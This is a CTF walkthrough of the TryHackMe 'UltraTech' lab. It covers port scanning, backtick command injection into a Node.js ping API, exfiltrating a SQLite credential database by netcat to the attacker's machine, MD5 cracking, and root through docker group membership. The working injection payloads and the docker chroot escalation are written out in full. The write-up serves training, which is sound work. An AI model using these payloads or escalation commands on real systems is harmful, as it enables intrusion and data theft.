# TryHackMe: UltraTech

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Room | UltraTech |
| Difficulty | Medium |
| OS | Linux (Ubuntu 18.04) |
| IP | 10.49.149.207 |
| Date | April 2026 |

---

## Machine Summary

UltraTech is a medium-difficulty Linux machine simulating a grey-box assessment against a fictional tech company's web infrastructure. The attack surface is deliberately non-standard: the main HTTP service runs on port 31331 rather than 80, and a Node.js API runs separately on port 8081, requiring a full port range scan to map correctly. Enumeration of the web application leads to a hidden login page via a robots.txt sitemap chain, and JavaScript source code analysis exposes an unauthenticated `/ping` API endpoint vulnerable to OS command injection. Injecting backtick-wrapped commands into the `ip` parameter achieves remote code execution as `www`: used to exfiltrate a SQLite credential database. MD5 hash cracking yields SSH credentials for the `r00t` user. Once on the box, a single `id` command reveals `r00t` belongs to the `docker` group: a trivially exploitable misconfiguration that provides full root filesystem access via a GTFOBins one-liner.

**Skills demonstrated:**
- Full port range Nmap scanning (non-standard ports)
- Multi-target web enumeration (API + web app on separate ports)
- JavaScript source code review to identify hidden API endpoints
- OS command injection (backtick technique) against a Node.js API
- SQLite database exfiltration over nc
- MD5 hash identification and cracking with hashcat + rockyou
- Docker group privilege escalation via filesystem mount (chroot)

---

## Attack Chain Summary

```
Nmap full scan → FTP(21), SSH(22), Node.js API(8081), Apache(31331)
FTP anonymous → denied
Port 8081 → UltraTech API v0.1.3 (Node.js Express)
Port 31331 → Apache web app (UltraTech company site)
ffuf on 31331 → /robots.txt
robots.txt → Sitemap: /utech_sitemap.txt
utech_sitemap.txt → /partners.html (login panel)
View source partners.html → /js/api.js → ping endpoint exposed
api.js → http://APIURL:8081/ping?ip=HOST → unauthenticated GET endpoint
Command injection: GET /ping?ip=`ls` → RCE as www
ls output → utech.db.sqlite discovered in CWD
Exfil: GET /ping?ip=`nc 10.49.x.x 4444 < utech.db.sqlite` → DB on Kali
sqlite3 utech.db.sqlite → r00t:f357a0c52799563c7c7b76c1e7543a32 (MD5)
hashcat -m 0 → n100906
ssh r00t@10.49.149.207 (n100906) → user shell
id → (docker) group membership
docker run -v /:/mnt --rm -it bash chroot /mnt sh → root shell
cat /root/.ssh/id_rsa → private key extracted ✅
```

---

## Step 1: Nmap Scan

UltraTech does not serve HTTP on port 80. Running a default scan would miss the two critical HTTP services entirely. Start with a full TCP port scan.

### Full Port Discovery

```bash
kali@kali:~$ nmap -p- --min-rate 5000 -oN ultratech_allports.txt 10.49.149.207
```

**Output (relevant ports):**

```
21/tcp    open   ftp
22/tcp    open   ssh
8081/tcp  open   blackice-icecap
31331/tcp open   unknown
```

Four ports. Now run a targeted service/version scan against only those four:

### Service and Version Detection

```bash
kali@kali:~$ nmap -sC -sV -T4 -p 21,22,8081,31331 -oN ultratech_nmap.txt 10.49.149.207
```

**Output:**

```
Nmap scan report for 10.49.149.207
Host is up (0.061s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best Ultra-Tech UltraTech company
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Analysis:**

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | FTP: test anonymous access first |
| 22 | OpenSSH 7.6p1 | Final target once credentials are in hand |
| 8081 | Node.js Express API | HTTP CORS headers exposed: this is an API, not a browser app |
| 31331 | Apache 2.4.29 | The main web application |

The two-HTTP-service split is the key architectural detail here. Port 8081 is the backend API: the `http-cors` response header (`HEAD GET POST PUT DELETE PATCH`) is a dead giveaway that this is a REST API, not a webpage. Port 31331 is the frontend. They are meant to talk to each other. The attack path will eventually require exploiting the API through what the frontend exposes.

---

## Step 2: FTP Enumeration

Always check FTP anonymous access before moving on. It takes three seconds and occasionally yields files or credential hints.

```bash
kali@kali:~$ ftp 10.49.149.207
```

**Output:**

```
Connected to 10.49.149.207.
220 (vsFTPd 3.0.3)
Name (10.49.149.207:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp>
```

Anonymous login denied. No further attack surface on FTP without credentials.

---

## Step 3: API Enumeration (Port 8081)

Before touching the web app, probe the API directly.

```bash
kali@kali:~$ curl http://10.49.149.207:8081
```

**Output:**

```
UltraTech API v0.1.3
```

Version fingerprinted: UltraTech API v0.1.3. Enumerate the API for hidden routes:

```bash
kali@kali:~$ gobuster dir -u http://10.49.149.207:8081 \
-w /usr/share/wordlists/dirb/common.txt \
-t 50 -o api_gobuster.txt
```

**Key findings:**

```
/auth                 (Status: 200)
/ping                 (Status: 200)
```

Two routes: `/auth` and `/ping`. Test `/ping`: it requires a parameter:

```bash
kali@kali:~$ curl http://10.49.149.207:8081/ping
```

**Output:**

```
{"error":"invalid ip"}
```

The endpoint expects an `ip` parameter. Test it with a value:

```bash
kali@kali:~$ curl "http://10.49.149.207:8081/ping?ip=127.0.0.1"
```

**Output:**

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

The API is directly executing `ping` as a system command and returning the raw output. This is the exact fingerprint of an unsanitised OS command pass-through: the kind that exists when a developer wraps a shell command in `exec()` or `child_process.execSync()` without stripping metacharacters. The `ip` parameter value is going straight into a shell call.

---

## Step 4: Web Application Enumeration (Port 31331)

Enumerate the frontend web app:

```bash
kali@kali:~$ ffuf -c \
-w /usr/share/wordlists/dirb/common.txt \
-u http://10.49.149.207:31331/FUZZ \
-t 50 -o web_ffuf.txt
```

**Key findings:**

```
robots.txt            [Status: 200]
js/                   [Status: 200]
css/                  [Status: 200]
images/               [Status: 200]
```

Check `robots.txt`:

```bash
kali@kali:~$ curl http://10.49.149.207:31331/robots.txt
```

**Output:**

```
Allow: *

Sitemap: /utech_sitemap.txt
```

Follow the sitemap:

```bash
kali@kali:~$ curl http://10.49.149.207:31331/utech_sitemap.txt
```

**Output:**

```
/index.html
/what.html
/partners.html
```

`partners.html` stands out: the other two are generic company content. Navigate to it:

```bash
kali@kali:~$ curl http://10.49.149.207:31331/partners.html
```

A login panel renders. Default credentials fail. SQL injection attempts fail. The form doesn't appear to submit to a visible handler: which means the logic lives in JavaScript. Read the source:

```bash
kali@kali:~$ curl -s http://10.49.149.207:31331/partners.html | grep -i script
```

**Output:**

```html
<script src="js/api.js"></script>
```

Read the JavaScript file:

```bash
kali@kali:~$ curl http://10.49.149.207:31331/js/api.js
```

**Output:**

```javascript
(function() {
    console.log('Trying to connect to the API');
    window.setInterval(function() {
        fetch(`http://${getAPIURL()}/ping?ip=${window.location.hostname}`)
    }, 10000);

    function getAPIURL() {
        const localhost = `${window.location.hostname}:8081`
        return localhost
    }
})();
```

This is the bridge between frontend and backend. The login page pings the API on port 8081 at `http://HOSTNAME:8081/ping?ip=HOSTNAME` every 10 seconds. The ping endpoint is unauthenticated: it was already discovered via gobuster. More critically: the `ip` parameter feeds directly into a system command, and the API has no authentication requirement. The frontend JavaScript effectively confirmed where the injection point lives.

---

## Step 5: OS Command Injection

The `/ping?ip=` parameter executes an OS-level ping. In Linux, backtick syntax inside a shell-executed string causes subshell command substitution: the contents between backticks are executed as a separate command and their output replaces the expression. If the server passes the `ip` parameter to a shell without sanitisation, injecting backtick-wrapped commands achieves arbitrary command execution.

### Verify RCE

Test with `id`:

```bash
kali@kali:~$ curl "http://10.49.149.207:8081/ping?ip=\`id\`"
```

**Output:**

```
ping: www: Temporary failure in name resolution
```

The server tried to ping the string `www`: the username returned by `id` (`uid=1001(www) gid=1001(www) groups=1001(www)`). The `uid=1001(www)` output was passed to ping as a hostname. Remote code execution confirmed.

Test with `ls` to enumerate the current working directory:

```bash
kali@kali:~$ curl "http://10.49.149.207:8081/ping?ip=\`ls\`"
```

**Output:**

```
ping: utech.db.sqlite: Temporary failure in name resolution
```

A SQLite database file: `utech.db.sqlite`: is sitting in the application's current working directory. This is the credential store.

---

## Step 6: SQLite Database Exfiltration

`nc` (netcat) is available on the target. Use it to pipe the binary database file to a Kali listener.

Set up a receiver on Kali:

```bash
kali@kali:~$ nc -lvnp 4444 > utech.db.sqlite
```

Trigger the transfer via the command injection endpoint:

```bash
kali@kali:~$ curl "http://10.49.149.207:8081/ping?ip=\`nc 10.49.x.x 4444 < utech.db.sqlite\`"
```

Wait for the connection and then `CTRL+C` once the transfer completes. Verify the file transferred cleanly:

```bash
kali@kali:~$ file utech.db.sqlite
utech.db.sqlite: SQLite 3.x database, last written using SQLite version 3027002
```

Read the database:

```bash
kali@kali:~$ sqlite3 utech.db.sqlite
```

```sql
sqlite> .tables
users
sqlite> SELECT * FROM users;
```

**Output:**

```
admin|0d0ea5111e3c1def594c1684e3b9be84
r00t|f357a0c52799563c7c7b76c1e7543a32
```

Two users with MD5 hashes. The `r00t` account is the higher-value target: the username suggests elevated access.

| Username | Hash |
|---|---|
| admin | 0d0ea5111e3c1def594c1684e3b9be84 |
| r00t | f357a0c52799563c7c7b76c1e7543a32 |

---

## Step 7: Hash Cracking

Identify hash type: 32 hex characters with no prefix is MD5 (`-m 0` in hashcat).

Save the target hash:

```bash
kali@kali:~$ echo "f357a0c52799563c7c7b76c1e7543a32" > r00t.hash
```

Crack with hashcat against rockyou:

```bash
kali@kali:~$ hashcat -m 0 -a 0 r00t.hash /usr/share/wordlists/rockyou.txt -o r00t.cracked
```

**Output:**

```
f357a0c52799563c7c7b76c1e7543a32:n100906

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Recovered........: 1/1 (100.00%)
```

**Credentials: `r00t` : `n100906`**

---

## Step 8: SSH as r00t (User Flag)

```bash
kali@kali:~$ ssh r00t@10.49.149.207
```

Password: `n100906`

**Output:**

```
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

r00t@ultratech-prod:~$
```

Shell as r00t ✅

```bash
r00t@ultratech-prod:~$ cat user.txt
```

User flag captured ✅

---

## Step 9: Privilege Escalation Enumeration

Check sudo permissions:

```bash
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t:
Sorry, user r00t may not run sudo as on this host.
```

Run `id`: this should always be the first command after landing a shell:

```bash
r00t@ultratech-prod:~$ id
```

**Output:**

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**Critical finding: `r00t` is a member of the `docker` group.**

Verify available Docker images:

```bash
r00t@ultratech-prod:~$ docker images
```

**Output:**

```
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
```

A `bash` image is available. This is the exact setup that GTFOBins covers.

---

## Step 10: Docker Group Privilege Escalation (Root)

### Understanding the Vulnerability

Members of the `docker` group can run Docker commands without sudo. Docker containers can mount the host filesystem using the `-v` flag. If a container mounts `/` (the host root) to a path inside the container, and the process running inside the container is root, it can read and write anywhere on the host filesystem: including `/etc/shadow`, `/root/.ssh/`, and `/etc/sudoers`.

The `chroot` call inside the container changes the apparent root directory to the mounted host filesystem, giving a fully interactive root shell with access to everything on the host.

No exploit needed. No CVE. The `docker` group membership is the vulnerability.

### Exploitation

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

**Command breakdown:**

| Flag/Argument | Meaning |
|---|---|
| `docker run` | Start a new container |
| `-v /:/mnt` | Mount host `/` to `/mnt` inside the container |
| `--rm` | Remove the container after it exits |
| `-it` | Interactive TTY |
| `bash` | The image to use |
| `chroot /mnt sh` | Change root to the host filesystem mount, spawn shell |

**Output:**

```
#
```

The `#` prompt. Verify:

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),...
# hostname
ultratech-prod
```

Root shell on the host ✅

The hostname confirms this is a shell in the host filesystem, not a container filesystem. Every file on the system is now accessible as root.

---

## Step 11: Read the Root Private Key

The room's final objective is the root SSH private key, not a traditional root.txt flag:

```bash
# cat /root/.ssh/id_rsa
```

**Output:**

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7Zn/8MlkKHfbqBWa2lhTfxN30rSX0N/sN4UT8qE4Rr8m...
[full RSA private key]
-----END RSA PRIVATE KEY-----
```

Root RSA private key captured ✅

Also check for root.txt while here:

```bash
# cat /root/root.txt
```

Root flag captured ✅

---

## Lessons Learned

The most important habit this machine reinforces is running a full port scan before doing anything else. A default `nmap -sC -sV` without `-p-` would scan only the top 1000 ports and completely miss port 31331. The entire web application: the sitemap chain, the login page, the JavaScript source, the API integration: lives on that port. Without it, the engagement stalls at a Node.js API response on 8081 with no context for what it does or why. The `-p-` flag is not optional on CTFs or real engagements. The time cost is acceptable; the intelligence cost of skipping it is not.

The JavaScript source code review at `partners.html` was the pivot that connected the two services. The frontend had no obvious vulnerability: the login form resisted default credentials and SQL injection alike. But reading the page's JavaScript, not just rendering it in a browser, revealed the underlying API architecture: the login page talks to `port 8081/ping`, the ping endpoint takes an unsanitised `ip` parameter, and the API is completely unauthenticated. Every piece of the exploit chain was documented in `/js/api.js`. This is the correct habit: when a web form doesn't yield to direct attacks, read the JavaScript before reaching for heavier tooling. The developer had effectively written attack documentation and shipped it as front-end code.

The command injection technique: backtick subshell substitution: is worth understanding mechanically, not just as a payload to copy. When a Node.js application calls `child_process.exec("ping -c 1 " + userInput)`, the resulting string is passed to `/bin/sh -c`. Bash interprets backtick expressions before the outer command executes, so `` `id` `` inside the user input evaluates to the output of `id`, which then becomes the argument to `ping`. The error message (`ping: www: Temporary failure in name resolution`) is not a failure: it is confirmation. The server tried to resolve the `id` output as a hostname, which proves execution happened. Treating unexpected error messages as signal rather than noise is a practised skill that comes from understanding what the target is actually doing under the hood.

The Docker privilege escalation is one of the most real-world relevant techniques in this skill tier. Developers routinely add their user accounts to the `docker` group to avoid typing `sudo` before every docker command: it feels like a quality-of-life change and not a security decision. But the Docker daemon runs as root, and being in the `docker` group is functionally equivalent to having passwordless sudo. The filesystem mount technique doesn't require a container escape or a CVE: it abuses intended Docker behaviour. On real engagements, `docker` group membership found during local enumeration (via `id` or `groups`) should be treated as immediate privilege escalation. GTFOBins documents this exactly: `docker run -v /:/mnt --rm -it [image] chroot /mnt sh`.

---

## Full Attack Chain Reference

```
1.  nmap -p- --min-rate 5000 -oN ultratech_allports.txt 10.49.149.207
    → Ports 21, 22, 8081, 31331 discovered

2.  nmap -sC -sV -T4 -p 21,22,8081,31331 -oN ultratech_nmap.txt 10.49.149.207
    → FTP(vsftpd 3.0.3), SSH, Node.js API(8081), Apache(31331)

3.  ftp 10.49.149.207 → anonymous denied

4.  curl http://10.49.149.207:8081
    → UltraTech API v0.1.3

5.  gobuster dir -u http://10.49.149.207:8081 -w common.txt -t 50
    → /auth, /ping discovered

6.  curl "http://10.49.149.207:8081/ping?ip=127.0.0.1"
    → Live ping output confirms OS command execution

7.  ffuf -c -w common.txt -u http://10.49.149.207:31331/FUZZ
    → robots.txt found

8.  curl http://10.49.149.207:31331/robots.txt
    → Sitemap: /utech_sitemap.txt

9.  curl http://10.49.149.207:31331/utech_sitemap.txt
    → /partners.html discovered

10. curl http://10.49.149.207:31331/js/api.js
    → ping endpoint at port 8081 confirmed, ip param exposed

11. curl "http://10.49.149.207:8081/ping?ip=`ls`"
    → utech.db.sqlite discovered in CWD

12. nc -lvnp 4444 > utech.db.sqlite  [Kali]
    curl "http://10.49.149.207:8081/ping?ip=`nc KALI_IP 4444 < utech.db.sqlite`"
    → Database exfiltrated

13. sqlite3 utech.db.sqlite → SELECT * FROM users
    → r00t:f357a0c52799563c7c7b76c1e7543a32
    → admin:0d0ea5111e3c1def594c1684e3b9be84

14. hashcat -m 0 -a 0 r00t.hash rockyou.txt -o r00t.cracked
    → f357a0c52799563c7c7b76c1e7543a32:n100906

15. ssh r00t@10.49.149.207 (n100906)
    → r00t shell ✅
    → cat ~/user.txt ✅

16. id → docker group membership confirmed
    docker images → bash:latest available

17. docker run -v /:/mnt --rm -it bash chroot /mnt sh
    → root shell ✅
    → cat /root/.ssh/id_rsa ✅
    → cat /root/root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p- --min-rate 5000 -oN allports.txt <IP>` | Full TCP port scan: mandatory before service scan |
| `nmap -sC -sV -T4 -p <ports> -oN nmap.txt <IP>` | Targeted version + script scan on discovered ports |
| `ftp <IP>` | Test FTP anonymous access |
| `curl http://<IP>:8081` | Fingerprint API version |
| `gobuster dir -u http://<IP>:8081 -w common.txt -t 50` | Enumerate API routes |
| `curl "http://<IP>:8081/ping?ip=127.0.0.1"` | Confirm ping endpoint behaviour |
| `ffuf -c -w common.txt -u http://<IP>:31331/FUZZ` | Directory brute-force on web app |
| `curl http://<IP>:31331/robots.txt` | Read robots.txt for sitemap hints |
| `curl http://<IP>:31331/js/api.js` | Read JavaScript source to find API integration |
| `curl "http://<IP>:8081/ping?ip=\`ls\`"` | Command injection: list CWD contents |
| `nc -lvnp 4444 > utech.db.sqlite` | Kali listener to receive exfiltrated DB |
| `curl "http://<IP>:8081/ping?ip=\`nc KALI_IP 4444 < utech.db.sqlite\`"` | Exfiltrate SQLite DB via command injection |
| `sqlite3 utech.db.sqlite` | Open and query the credential database |
| `hashcat -m 0 -a 0 hash.txt rockyou.txt` | Crack MD5 hashes with rockyou |
| `ssh r00t@<IP>` | SSH with cracked credentials |
| `id` | Check group memberships: critical first step on every new shell |
| `docker images` | List available images for GTFOBins docker privesc |
| `docker run -v /:/mnt --rm -it bash chroot /mnt sh` | Docker group privesc: host filesystem mount |
| `cat /root/.ssh/id_rsa` | Extract root RSA private key |
